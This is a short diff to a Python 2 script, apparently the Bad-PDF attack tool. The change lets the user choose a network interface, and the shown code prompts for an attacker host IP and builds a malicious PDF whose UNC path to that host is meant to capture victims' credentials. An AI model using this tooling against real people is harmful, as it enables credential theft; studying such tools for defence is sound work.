@@ -123,7 +123,10 @@ if __name__ == "__main__":
 
         host = raw_input("Please enter Bad-PDF host IP: \n")
         filename = raw_input("Please enter output file name: \n")
-        interface = raw_input("Please enter the interface name to listen(Default eth0): \n")
+        ifc = raw_input("Please enter the interface name to listen(Default eth0): \n")
+        if ifc != '':
+            interface = ifc
+
         create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
         print("Bad PDF %s created" %filename)
